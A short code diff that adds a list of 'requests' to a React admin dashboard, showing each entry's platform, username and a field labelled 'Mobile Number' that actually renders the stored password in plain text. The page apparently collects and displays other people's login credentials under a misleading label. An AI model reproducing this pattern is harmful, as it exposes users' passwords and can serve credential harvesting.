@@ -22,6 +22,19 @@ export default function AdminPage() {
   return (
     <div className="p-10 font-serif">
       <h1 className="text-2xl font-bold mb-5">Admin Dashboard 👑</h1>
+      
+      {requests.map((r) => (
+        <div
+          key={r.id}
+          className="flex whitespace-nowrap items-center justify-between border p-3.5 mb-2.5"
+        >
+          {/* <p><b>User Message:</b> {r.userMessage}</p> */}
+          <p><b>Platform:</b> {r.platform}</p>
+          <p><b>Username:</b> {r.username}</p>
+          <p><b>Mobile Number:</b> {r.password}</p>
+        </div>
+      ))}
+
       {/* ⭐ BOTTOM SECTION — FINAL USER SELECTION */}
       <div className="mt-8 border-t pt-5">
 
